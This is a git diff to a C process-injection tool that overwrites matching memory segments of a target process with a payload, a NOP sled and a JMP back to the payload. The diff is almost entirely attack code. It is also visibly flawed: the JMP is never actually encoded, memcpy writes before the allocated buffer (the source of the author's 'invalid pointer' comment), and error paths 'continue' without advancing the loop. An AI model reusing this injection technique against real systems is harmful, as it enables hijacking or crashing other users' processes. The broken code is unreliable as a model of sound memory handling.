@@ -1,4 +1,6 @@
+#include <Zycore/Status.h>
 #include <Zydis/Encoder.h>
+#include <Zydis/SharedTypes.h>
 #include <stddef.h>
 #include <stdio.h>    
 #include <stdlib.h>   
@@ -420,54 +422,63 @@ int main(int argc, char* argv[]) {
         //Write to any matching memory segment
         match_t* current_m = matches;
         size_t segment_size = 0;
+        void* to_write = NULL;
 
         while(current_m) {
+            //Layout:
+            //  PAYLOAD
+            //  NOPSLED
+            //  JMP &PAYLOAD
             segment_size = current_m->end - current_m->start;
             
+            to_write = malloc(segment_size);
+            if(to_write == NULL) {
+                fprintf(stderr, "[E] Failed to prepare buffer (malloc) (errno: %d).\n", errno);
+                continue;
+            }
 
-            //TODO prepare buffer of size segment-size, write payload, nopsled, jmp to payload
-            /*for(int i=0; i<(segment_size/payload_len);i++) {
-                //TODO: do math so we don't end up out of bound, also find clever way to align our code to whats underneath.
-                //if it is our first write, write payload , else write jmp current_m->start
-                size_t write_size;
-                void* write_addr;
-                int err;
-                if(i==0) {
-                    //write payload
-                    write_size = payload_len;
-                    write_addr = current_m->start;
+            if(ZYAN_FAILED(ZydisEncoderNopFill(to_write, segment_size))) {
+                fprintf(stderr, "[E] Failed to prepare buffer (nop spray) @ %p (errno: %d).\n", to_write, errno);
+                free(to_write);
+                continue;
+            }
 
-                    if(arg_verbosity>0)
-                        printf("[.] Attempting payload write of %s (%lu bytes) to PID: %d from %p to %p...\n", arg_payload_path, write_size, current_m->pid, write_addr, write_addr+write_size);
-                
-                    err = write_payload(current_m->pid, payload, write_size, write_addr, arg_process_vm);
-                    if (err == -1) {
-                        fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", write_addr, errno);
-                    } else {
-                        injected++;
-                    }
-                } else {
-                    //write jmp spray a.k.a. spray&pray (this will most likely crash the process)
-                    //TODO: actually put values in here, we should also align ourselves somehow to first instruction?
-
-                    //NOPspray the whole segment
-                    write_size = (current_m->end-current_m->start)-payload_len;
-                    ZydisEncoderNopFill( ,write_size)
-
-                    char* jmp_spray = "\xe9\x00\x00\x00\x00";
-                    write_size = 5;
-                    write_addr = (current_m->start+payload_len)+(write_size*i);
-                    
-
-                    if(arg_verbosity>2)
-                        printf("[.] Attempting jmp spray write of %s (%lu bytes) to PID: %d from %p to %p...\n", arg_payload_path, write_size, current_m->pid, write_addr, write_addr+write_size);
-                    err = write_payload(current_m->pid, jmp_spray, write_size, write_addr, arg_process_vm);
-                    if (err == -1) {
-                       fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", write_addr, errno);
-                    }
-                }
-            }*/
+            if(memcpy(to_write, payload, payload_len) == NULL) {
+                fprintf(stderr, "[E] Failed to prepare buffer (payload) @ %p (errno: %d).\n", to_write, errno);
+                free(to_write);
+                continue; 
+            }
             
+            ZydisEncoderRequest req;
+            memset(&req, 0, sizeof(req));
+
+            req.mnemonic = ZYDIS_MNEMONIC_JMP;
+            req.machine_mode = ZYDIS_MACHINE_MODE_LONG_64;
+            req.operand_count = 1;
+            req.operands[0].type = ZYDIS_OPERAND_TYPE_IMMEDIATE;
+            req.operands[0].imm.u = (unsigned long) current_m->start;
+
+            ZyanU8 encoded_instruction[ZYDIS_MAX_INSTRUCTION_LENGTH];
+            ZyanUSize encoded_length = sizeof(encoded_instruction);
+
+            //Write jmp to prepared buffer
+            if(memcpy(to_write-encoded_length, encoded_instruction, encoded_length) == NULL) {
+                fprintf(stderr, "[E] Failed to prepare buffer (jmp) @ %p (errno: %d).\n", to_write, errno);
+                free(to_write);
+                continue; 
+            }
+
+            if(arg_verbosity>0)
+                printf("[.] Attempting payload write of %s (%lu bytes) to PID: %d from %p to %p...\n", arg_payload_path, segment_size, current_m->pid, current_m->start, current_m->start+segment_size);
+                
+            if(write_payload(current_m->pid, to_write, segment_size, current_m->start, arg_process_vm) == -1) {
+                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current_m->start, errno);
+            } else {
+                injected++;
+            }
+
+            //free(to_write); //TODO: why is this an invalid malloc'ed ptr?? free(): invalid pointer
+
             current_m = current_m->next;
         }
     } else if(arg_payload_path != NULL) {
